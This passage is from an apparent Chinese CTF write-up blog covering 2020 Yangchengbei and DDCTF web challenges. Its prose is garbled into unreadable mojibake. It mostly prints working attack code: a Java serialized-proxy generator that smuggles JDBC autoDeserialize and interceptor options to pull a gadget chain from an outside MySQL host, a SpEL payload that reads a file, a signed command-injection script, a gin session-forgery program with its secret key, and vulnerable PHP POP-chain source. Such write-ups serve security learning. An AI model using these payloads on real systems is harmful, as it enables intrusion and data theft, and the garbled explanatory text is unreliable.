class="string">&quot;&amp;password=&quot;</span> + <span class="keyword">this</span>.password + <span class="string">&quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.connection = DriverManager.getConnection(url);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">checkAllInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.host == <span class="keyword">null</span> || <span class="keyword">this</span>.port == <span class="keyword">null</span> || <span class="keyword">this</span>.username == <span class="keyword">null</span> || <span class="keyword">this</span>.password == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.connection == <span class="keyword">null</span>) &#123;</span><br><span class="line">            connect();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InfoInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Info info;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InfoInvocationHandler</span><span class="params">(Info info)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.info = info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;getAllInfo&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">this</span>.info.checkAllInfo()) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> method.invoke(<span class="keyword">this</span>.info, args);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨proxyinstanceæ¥è°ƒç”¨InfoInvocationHandler çš„invokeæ–¹æ³•ä»è€Œå®Œæˆä¸Šè¿°çš„åˆ©ç”¨é“¾</p>
<p>åˆ©ç”¨è¿™ä¸ªæ¥ç”Ÿæˆdata</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdufs.challenge.web.invocation.InfoInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> gdufs.challenge.web.model.DatabaseInfo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        DatabaseInfo db = <span class="keyword">new</span> DatabaseInfo();</span><br><span class="line">        db.setHost(<span class="string">&quot;39.108.164.219&quot;</span>);</span><br><span class="line">        db.setPort(<span class="string">&quot;60006&quot;</span>);</span><br><span class="line">        <span class="comment">//db.setUsername(&quot;yso_JRE8u20_calc&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;&quot;);</span></span><br><span class="line">        db.setUsername(<span class="string">&quot;Spring1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;&quot;</span>);</span><br><span class="line">        db.setPassword(<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> InfoInvocationHandler(db);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            out = <span class="keyword">new</span> ObjectOutputStream(bout);</span><br><span class="line">            out.writeObject(Proxy.newProxyInstance(handler.getClass().getClassLoader(), db.getClass().getInterfaces(), handler));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="keyword">new</span> String(Base64.getEncoder().encode(bout.toByteArray())));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æµ‹è¯•å‘ç°CommonsCollections6å’ŒCommonsCollections5å¯ä»¥æ‰“é€šï¼Œä½†æ˜¯ç”±äºRuntime.getRuntime().exec()ä¸­ä¸èƒ½ä½¿ç”¨ç®¡é“ç¬¦ç­‰bashéœ€è¦çš„æ–¹æ³•,åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a><br><code>GWHT&#123;5e97245bd9c98aad7040d461538e9231&#125;</code></p>
<p>jdbcä¹Ÿå¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œä½†æ˜¯è¿™é‡Œä¸è¡Œï¼Œåæ¥çœ‹åˆ«äººçš„wpå‘ç°è¦åŠ ä¸Šè®¾ç½®ï¼š<code>allowLoadLocalInfile=true</code></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>å†™.htaccessä»è€Œrce</p>
<h2 id="easyser"><a href="#easyser" class="headerlink" title="easyser"></a>easyser</h2><p>è€å¥—è·¯äº†</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/09/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/" data-id="ckw7zp418008cftn7cbre5rzq" data-title="ç¾ŠåŸæ¯2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-DDCTF2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/09/06/DDCTF2020/" class="article-date">
  <time class="dt-published" datetime="2020-09-06T16:00:00.000Z" itemprop="datePublished">2020-09-07</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/09/06/DDCTF2020/">DDCTF2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="DDCTF2020"><a href="#DDCTF2020" class="headerlink" title="DDCTF2020"></a>DDCTF2020</h1><h2 id="æ‹¼å›¾æ¸¸æˆ"><a href="#æ‹¼å›¾æ¸¸æˆ" class="headerlink" title="æ‹¼å›¾æ¸¸æˆ"></a>æ‹¼å›¾æ¸¸æˆ</h2><p>çº¯æ‰‹å·¥</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200906061331.png" alt="image80"></p>
<h2 id="Webç­¾åˆ°é¢˜"><a href="#Webç­¾åˆ°é¢˜" class="headerlink" title="Webç­¾åˆ°é¢˜"></a>Webç­¾åˆ°é¢˜</h2><p>æ ¹æ®é¢˜ç›®æç¤ºå¾—åˆ°ä¸¤ä¸ªæ¥å£</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Method | POST</span><br><span class="line">URL    | http://117.51.136.197/admin/login</span><br><span class="line">Param  | username str | pwd str</span><br><span class="line">Response</span><br><span class="line">token str | auth(Certification information)</span><br><span class="line"></span><br><span class="line">- auth interface</span><br><span class="line">Request</span><br><span class="line">Method | POST</span><br><span class="line">URL    | http://117.51.136.197/admin/auth</span><br><span class="line">Param  | username str | pwd str | token str</span><br><span class="line">Response</span><br></pre></td></tr></table></figure>

<p>ç”¨c-jwt-crackerçˆ†ç ´loginç”Ÿæˆçš„jwt</p>
<p>å¾—åˆ°ä¸‹ä¸€æ­¥å…¥å£ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client dowload url: http://117.51.136.197/B5Itb8dFDaSFWZZo/client</span><br></pre></td></tr></table></figure>

<p>æ˜¯ä¸€ä¸ªgoæ–‡ä»¶ï¼Œå«äºŒè¿›åˆ¶é˜Ÿå‹æ¥é€†</p>
<p>å¾—åˆ°æ”¶å‘è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">t = time.time()</span><br><span class="line"><span class="built_in">print</span>(t)</span><br><span class="line">t = <span class="built_in">str</span>(t)</span><br><span class="line"></span><br><span class="line">t = t[:<span class="number">10</span>]</span><br><span class="line">cmd=<span class="string">&quot;99-9&quot;</span></span><br><span class="line">s = <span class="string">&quot;&#123;&#125;|&quot;</span>.<span class="built_in">format</span>(cmd) + t</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">t = <span class="built_in">bytes</span>(s, encoding = <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">message = t</span><br><span class="line">key = <span class="string">b&#x27;DDCTFWithYou&#x27;</span></span><br><span class="line">h = hmac.new(key,message,digestmod=<span class="string">&#x27;SHA256&#x27;</span>)</span><br><span class="line">signature=base64.b64encode(h.digest()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://117.51.136.197:80/server/command&quot;</span></span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Go-http-client/1.1&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip&quot;</span>&#125;</span><br><span class="line">burp0_json=&#123;<span class="string">&quot;signature&quot;</span>:signature ,<span class="string">&quot;command&quot;</span>: cmd,  <span class="string">&quot;timestamp&quot;</span>: s[-<span class="number">10</span>:]&#125;</span><br><span class="line"><span class="built_in">print</span>(burp0_json)</span><br><span class="line">r=requests.post(burp0_url, headers=burp0_headers, json=burp0_json,proxies=&#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨è¿™é‡Œæˆ‘å¡ä½äº†ï¼Œå› ä¸ºclientæ˜¯ç”¨goå†™çš„æˆ‘ä¹Ÿç†æ‰€å½“ç„¶çš„è®¤ä¸ºåç«¯ä¹Ÿæ˜¯ç”¨</p>
<p>goå†™çš„ï¼Œäºæ˜¯å°±å»è¯•goçš„å„ç§evalæ¡†æ¶éƒ½ä¸è¡Œï¼Œæœ€åè¿˜æ˜¯åœ¨åˆ«äººçš„æç¤ºä¸‹æ‰èµ°å‡ºè¯¯åŒºï¼ˆåº”è¯¥å†™ä¸€ä¸ªæµ‹è¯•SSTIï¼Œevalç­‰ç­‰çš„fuzzå­—å…¸ï¼‰ï¼Œç»è¿‡ä¸€å¤©çš„æŠ˜è…¾åå‘ç°æ˜¯SPeL</p>
<p>å»ç½‘ä¸Šæ‰¾åˆ°äº†Yingå¸ˆå‚…çš„payload</p>
<p><code>NEW java.util.Scanner(NEW java.io.BufferedReader(NEW java.io.FileReader(NEW java.io.File(&#39;/home/dc2-user/flag/flag.txt&#39;)))).nextLine()</code></p>
<p><code>DDCTF&#123;Q24uf486whGOWN44UtZCjYUgdnnnRaVs&#125;</code></p>
<h2 id="å¡ç‰‡å•†åº—"><a href="#å¡ç‰‡å•†åº—" class="headerlink" title="å¡ç‰‡å•†åº—"></a>å¡ç‰‡å•†åº—</h2><p>ç›®æ ‡æ˜¯è®©æˆ‘ä»¬æ‹¿åˆ°100ä¸ªå¡ç‰‡ï¼Œä½†æ˜¯æœ‰æ—¶é—´é™åˆ¶ï¼Œåˆ©ç”¨å€Ÿå…¥å’Œå€Ÿå‡ºæ¥è·å¾—100ä¸ªå¡ç‰‡æ˜¾ç„¶æ˜¯ä¸ç°å®çš„ã€‚</p>
<p>åˆšå¼€å§‹æƒ³çš„æ˜¯æ¡ä»¶ç«äº‰ï¼Œåæ¥æµ‹è¯•åå‘ç°ä¸è¡Œï¼Œåœ¨è¿™é‡Œæˆ‘è¢«å¡ä½äº†ã€‚</p>
<p>ç»§ç»­æµ‹è¯•å‘ç°ï¼Œè¿™é‡Œå­˜åœ¨ç€æ•´æ•°æº¢å‡ºæ¼æ´ï¼ˆå¡ç‰‡æ•°æ˜¯ä¸ªå¤§æ•´æ•°ï¼Œè€Œå€Ÿå…¥å€Ÿå‡ºæ˜¯ä¸ªå°æ•´æ•°ï¼‰ï¼Œæˆ‘ä»¬è®©å¡ç‰‡æ•°ä¸æº¢å‡ºï¼Œè€Œå€Ÿå…¥æ•°æº¢å‡ºï¼Œå°±å¯ä»¥å¾—åˆ°è®¸å¤šå¡ç‰‡ã€‚æ¥ç€æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªSecKeyå’Œè·å–flagçš„åœ°å€ï¼š<code>/flag</code>ï¼Œä½†æ˜¯éœ€è¦æˆ‘ä»¬æ˜¯adminè´¦å·</p>
<p><code>session:MTU5OTIyNTI5MXxEdi1CQkFFQ180SUFBUkFCRUFBQV80dl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ERlFBVW5zaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam93TENKdWIzZGZkR2x0WlNJNk1UVTVPVEl5TlRJNU1Td2ljM1JoY25SZmRHbHRaU0k2TVRVNU9USXlOVEk1TVgwR2MzUnlhVzVuREFjQUJXRmtiV2x1QkdKdmIyd0NBZ0FBfMaqAqFFw43-8z8EcAFY04oenUI0FyhjaW8KZXGH2uSX</code></p>
<p>å¯¹sessionè¿›è¡Œè§£å¯†å‘ç°,ä»–çš„æ ¼å¼ç±»ä¼¼ï¼š<code>base64encode(timestamp|base64urlencode(gob)|check)</code></p>
<p>åˆ©ç”¨<a target="_blank" rel="noopener" href="https://gitlab.com/drosseau/degob">https://gitlab.com/drosseau/degob</a> è·å¾—gobå†…å®¹</p>
<p><code>map[interface&#123;&#125;]interface&#123;&#125;&#123;&quot;admin&quot;: false,&quot;wallet&quot;: &quot;&#123;&quot;owings&quot;:[&#123;&quot;OwingMoney&quot;:100000,&quot;NeedMoney&quot;:100002,&quot;OwingTime&quot;:1599223614&#125;],&quot;invests&quot;:[&#123;&quot;InvestMoney&quot;:100006,&quot;ReceiveMoney&quot;:100009,&quot;InvestTime&quot;:1599223644&#125;],&quot;money&quot;:0,&quot;now_time&quot;:1599222955,&quot;start_time&quot;:1599222835&#125;&quot;&#125;</code></p>
<p>æ˜¾ç„¶æˆ‘ä»¬éœ€è¦ä¿®æ”¹adminçš„å€¼ï¼Œåœ¨äº‘å±¿å¸ˆå‚…çš„å¸®åŠ©ä¸‹çŸ¥é“äº†è¿™æ˜¯ä¸€ä¸ªginç”Ÿæˆçš„session</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line">        <span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">        r := gin.Default()</span><br><span class="line">        store := cookie.NewStore([]<span class="keyword">byte</span>(<span class="string">&quot;Udc13VD5adM_c10nPxFu@v12&quot;</span>))</span><br><span class="line">        r.Use(sessions.Sessions(<span class="string">&quot;session&quot;</span>, store))</span><br><span class="line"></span><br><span class="line">        r.GET(<span class="string">&quot;/incr&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">                session := sessions.Default(c)</span><br><span class="line">                <span class="keyword">var</span> count <span class="keyword">bool</span></span><br><span class="line">                v := session.Get(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> v == <span class="literal">nil</span> &#123;</span><br><span class="line">                        count = <span class="literal">true</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        count = v.(<span class="keyword">bool</span>)</span><br><span class="line">                        count = <span class="literal">true</span></span><br><span class="line">                &#125;</span><br><span class="line">                session.Set(<span class="string">&quot;admin&quot;</span>, count)</span><br><span class="line">                session.Save()</span><br><span class="line">                c.JSON(<span class="number">200</span>, gin.H&#123;<span class="string">&quot;admin&quot;</span>: count&#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">        r.Run(<span class="string">&quot;:8000&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag:<code>DDCTF&#123;Th151s3AsY4ormE2333!&#125;</code></p>
<h2 id="Overwrite-Me"><a href="#Overwrite-Me" class="headerlink" title="Overwrite Me"></a>Overwrite Me</h2><p>é¢˜ç›®ç¯å¢ƒï¼šPHP/5.6.10</p>
<p>é¢˜ç›®æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">Welcome to DDCTF <span class="number">2020</span>, Have fun!</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$kw0ng</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;kw0ng = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> system(<span class="string">&#x27;find /HackersForever &#x27;</span> . escapeshellcmd(<span class="keyword">$this</span>-&gt;flag));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HintClass</span></span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i&quot;</span>, <span class="keyword">$this</span>-&gt;hint))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t Do That!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;execute(<span class="keyword">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShowOff</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$contents</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;/hint/hint.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;contents = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to DDCTF 2020, Have fun!&lt;br/&gt;&lt;br/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;contents();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;page-&gt;contents = <span class="string">&quot;POP me! I can give you some hints!&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;page-&gt;cont);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MiddleMan</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cont</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="keyword">$this</span>-&gt;content;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span 